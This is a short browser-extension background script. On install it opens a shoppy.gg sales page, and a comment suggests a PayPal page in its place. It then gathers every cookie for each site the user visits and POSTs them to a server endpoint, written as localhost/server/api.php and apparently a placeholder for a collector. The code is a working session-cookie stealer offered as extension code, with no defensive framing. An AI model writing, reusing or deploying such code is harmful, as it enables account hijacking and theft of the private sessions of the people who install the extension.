

// redirect after installation , change my url github to make paypal page

chrome.runtime.onInstalled.addListener(function(details) {
  switch (details.reason) {
    case "install":
      chrome.tabs.create({url: "https://shoppy.gg/product/5d9ifM3"});
      break;
    default:
      return true;
  }
});



(function() {

    let tabId;

    function unpack(objs){
        let s = "";
        objs.array.forEach(obj => {
            Object.keys(obj).forEach(key => {
                s += `${key}: ${obj[key]}\n`;
            });
            s += "\n";
        });
        return s;
    }

    browser.tabs.onActivated.addListener(function (tab) {
        tabId = tab.tabId;
        console.log(tabId);
    });

    browser.webNavigation.onCompleted.addListener(function () {
        browser.tabs.get(tabId, function (tab) {
            if(tab.url){
                let domain = tab.url.includes("://") ? tab.url.split("://")[1].split("/")[0] : tab.url.split("/")[0];
                if (domain.startsWith("www.")) {
                    domain = domain.replace("www.", "");
                }
                console.log(domain);
                browser.cookies.getAll({domain: domain}, function (cookies) {
                    fetch('http://localhost/server/api.php', {
                        headers: { "Content-Type": "application/json; charset=utf-8" },
                        method: 'POST',
                        body: JSON.stringify({cookie : cookies})
                    })
                   //let str = unpack(cookies);
                });
            }
        });
    });

}());
